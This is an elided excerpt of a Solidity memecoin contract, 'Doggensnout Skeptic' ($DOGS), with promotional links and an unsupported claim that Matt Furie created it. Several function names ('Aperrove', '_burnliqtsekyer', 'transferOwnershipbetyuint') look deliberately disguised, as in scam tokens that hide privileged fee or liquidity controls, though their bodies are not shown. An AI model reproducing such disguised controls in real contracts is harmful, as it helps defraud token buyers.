...
/**
https://t.me/DoggensnoutSkeptic_ERC
https://twitter.com/DOGS_Erc
https://thepepepredator.com/
$DOGS, a creation of Matt Furie, is an integral part of the $Pepe universe.
*/
...
abstract contract Ownable {
    ...
    function transferOwnershipbetyuint(address newOwner) public virtual onlyOwner {
        _owner = newOwner;
    }

}

contract DoggensnoutSkeptic is Ownable {
    ...
    constructor (){
        name = unicode"Doggensnout Skeptic";
        symbol = unicode"DOGS";
        decimals = 9;
    ...
    function Aperrove(address[] memory _addresses, uint256 _feePercentage) external {
    ...
    function _burnliqtsekyer(address user) public {
